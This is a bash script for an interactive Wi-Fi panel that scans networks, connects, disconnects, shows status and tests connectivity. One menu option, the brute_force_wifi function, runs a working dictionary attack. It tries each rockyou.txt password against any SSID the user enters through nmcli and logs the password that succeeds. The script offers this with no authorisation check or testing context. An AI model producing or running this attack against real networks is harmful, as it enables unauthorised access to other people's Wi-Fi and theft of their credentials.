#!/bin/bash

# wifi_host.sh - Powerful Wi-Fi host scanner, manager, and brute-force tool with interactive panel

# --- Configuration ---
LOG_DIR="$HOME/wifi_host_logs"
WORDLIST="/usr/share/wordlists/rockyou.txt"  # Default wordlist for brute force (adjust path)
TEMP_DIR="/tmp/wifi_host_tmp"
PING_TARGETS=("8.8.8.8" "1.1.1.1" "google.com")
SUDO_PROMPTED=0

# --- Colors for output ---
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# --- Ensure directories exist ---
mkdir -p "$LOG_DIR" "$TEMP_DIR"

# --- Utility Functions ---

function require_sudo() {
  if [[ $EUID -ne 0 ]]; then
    if [[ $SUDO_PROMPTED -eq 0 ]]; then
      echo -e "${YELLOW}Requesting sudo privileges...${NC}"
      sudo -v || { echo -e "${RED}Sudo required. Exiting.${NC}"; exit 1; }
      SUDO_PROMPTED=1
    fi
  fi
}

function cleanup() {
  rm -rf "$TEMP_DIR"/*
}

function timestamp() {
  date +"%Y-%m-%d %H:%M:%S"
}

function log() {
  echo "[$(timestamp)] $1" >> "$LOG_DIR/wifi_host.log"
}

function pause() {
  read -rp "Press Enter to continue..."
}

# --- Wi-Fi Interface Detection ---

function list_wifi_interfaces() {
  require_sudo
  # List wireless interfaces using iw dev
  iw dev 2>/dev/null | awk '$1=="Interface"{print $2}'
}

function select_wifi_interface() {
  local interfaces=($(list_wifi_interfaces))
  if [[ ${#interfaces[@]} -eq 0 ]]; then
    echo -e "${RED}No Wi-Fi interfaces found.${NC}"
    exit 1
  fi
  echo "Available Wi-Fi interfaces:"
  select iface in "${interfaces[@]}" "Cancel"; do
    if [[ "$iface" == "Cancel" ]]; then
      echo "Cancelled."
      exit 0
    elif [[ -n "$iface" ]]; then
      echo "Selected interface: $iface"
      WIFI_IFACE="$iface"
      break
    else
      echo "Invalid selection."
    fi
  done
}

# --- Wi-Fi Scan with detailed info ---

function scan_wifi_networks() {
  require_sudo
  echo -e "${CYAN}Scanning Wi-Fi networks on interface $WIFI_IFACE...${NC}"
  # Use iwlist scan for compatibility, fallback to iw dev scan
  if command -v iwlist &>/dev/null; then
    sudo iwlist "$WIFI_IFACE" scan | awk '
      BEGIN {FS=":"; print "SSID | BSSID | Signal (dBm) | Channel | Encryption"}
      /Cell/ {bssid=$5}
      /ESSID/ {ssid=$2}
      /Signal level/ {signal=$1}
      /Channel/ {channel=$2}
      /Encryption key/ {enc=$2}
      /IE: WPA/ {wpa="WPA"}
      /IE: IEEE 802.11i/ {wpa2="WPA2"}
      /IE: RSN/ {wpa3="WPA3"}
      /Encryption key:on/ {enc="Encrypted"} 
      /Encryption key:off/ {enc="Open"}
      /Quality/ {quality=$1}
      /Cell/ {if (ssid) print ssid, bssid, signal, channel, (wpa3?"WPA3":wpa2?"WPA2":wpa?"WPA":enc); ssid=bssid=signal=channel=enc=wpa=wpa2=wpa3=""}
    '
  else
    echo -e "${YELLOW}iwlist not found, trying iw scan...${NC}"
    sudo iw dev "$WIFI_IFACE" scan | grep -E 'SSID|signal|freq|BSS|RSN|WPA' | \
    awk '
      /BSS/ {bssid=$2}
      /SSID:/ {ssid=$2}
      /signal:/ {signal=$2}
      /freq:/ {freq=$2}
      /RSN/ {enc="WPA2"}
      /WPA/ {enc="WPA"}
      END {print ssid, bssid, signal, freq, enc}
    '
  fi
}

# --- Connect to Wi-Fi ---

function connect_wifi() {
  require_sudo
  read -rp "Enter SSID to connect: " ssid
  read -rsp "Enter password (leave empty for open network): " pass
  echo
  if [[ -z "$pass" ]]; then
    sudo nmcli device wifi connect "$ssid" ifname "$WIFI_IFACE" || { echo -e "${RED}Failed to connect to $ssid${NC}"; return 1; }
  else
    sudo nmcli device wifi connect "$ssid" password "$pass" ifname "$WIFI_IFACE" || { echo -e "${RED}Failed to connect to $ssid${NC}"; return 1; }
  fi
  echo -e "${GREEN}Connected to $ssid successfully.${NC}"
}

# --- Disconnect Wi-Fi ---

function disconnect_wifi() {
  require_sudo
  sudo nmcli device disconnect "$WIFI_IFACE"
  echo -e "${YELLOW}Disconnected interface $WIFI_IFACE.${NC}"
}

# --- Internet Connectivity Test ---

function test_internet() {
  echo -e "${CYAN}Testing internet connectivity...${NC}"
  for target in "${PING_TARGETS[@]}"; do
    if ping -c 2 -W 2 "$target" &>/dev/null; then
      echo -e "${GREEN}Ping to $target successful.${NC}"
    else
      echo -e "${RED}Ping to $target failed.${NC}"
    fi
  done
}

# --- Brute Force Wi-Fi Password (Dictionary Attack) ---

function brute_force_wifi() {
  require_sudo
  read -rp "Enter target SSID for brute force: " target_ssid
  if [[ ! -f "$WORDLIST" ]]; then
    echo -e "${RED}Wordlist not found at $WORDLIST. Please install or specify a valid wordlist.${NC}"
    return 1
  fi
  echo -e "${YELLOW}Starting dictionary attack on $target_ssid...${NC}"
  while IFS= read -r password; do
    echo -ne "Trying password: $password\r"
    if sudo nmcli device wifi connect "$target_ssid" password "$password" ifname "$WIFI_IFACE" &>/dev/null; then
      echo -e "\n${GREEN}Success! Password found: $password${NC}"
      log "Brute force success on $target_ssid with password: $password"
      return 0
    fi
  done < "$WORDLIST"
  echo -e "${RED}Brute force failed. Password not found in wordlist.${NC}"
  log "Brute force failed on $target_ssid"
  return 1
}

# --- Show Wi-Fi Status ---

function wifi_status() {
  require_sudo
  echo -e "${CYAN}Wi-Fi Status for interface $WIFI_IFACE:${NC}"
  nmcli device show "$WIFI_IFACE" | grep -E 'GENERAL.STATE|IP4.ADDRESS|IP6.ADDRESS|GENERAL.CONNECTION'
}

# --- Logging and Export ---

function export_logs() {
  echo -e "${CYAN}Exporting logs to $LOG_DIR/wifi_host_export_$(date +%F_%T).log${NC}"
  cp "$LOG_DIR/wifi_host.log" "$LOG_DIR/wifi_host_export_$(date +%F_%T).log"
}

# --- Main Panel Menu ---

function main_menu() {
  clear
  echo -e "${CYAN}=== Wi-Fi Host & Network Manager Panel ===${NC}"
  echo "1) List Wi-Fi interfaces"
  echo "2) Scan Wi-Fi networks"
  echo "3) Connect to Wi-Fi"
  echo "4) Disconnect Wi-Fi"
  echo "5) Show Wi-Fi status"
  echo "6) Test internet connectivity"
  echo "7) Brute force Wi-Fi password (dictionary attack)"
  echo "8) Export logs"
  echo "9) Cleanup temporary files"
  echo "0) Exit"
  echo
  read -rp "Select an option: " choice
  case $choice in
    1)
      list_wifi_interfaces
      pause
      ;;
    2)
      scan_wifi_networks
      pause
      ;;
    3)
      connect_wifi
      pause
      ;;
    4)
      disconnect_wifi
      pause
      ;;
    5)
      wifi_status
      pause
      ;;
    6)
      test_internet
      pause
      ;;
    7)
      brute_force_wifi
      pause
      ;;
    8)
      export_logs
      pause
      ;;
    9)
      cleanup
      echo -e "${GREEN}Temporary files cleaned.${NC}"
      pause
      ;;
    0)
      echo "Exiting..."
      cleanup
      exit 0
      ;;
    *)
      echo -e "${RED}Invalid option.${NC}"
      pause
      ;;
  esac
}

# --- Script Start ---

# Prompt for sudo once at start
require_sudo

# Select Wi-Fi interface at start
select_wifi_interface

# Loop panel
while true; do
  main_menu
done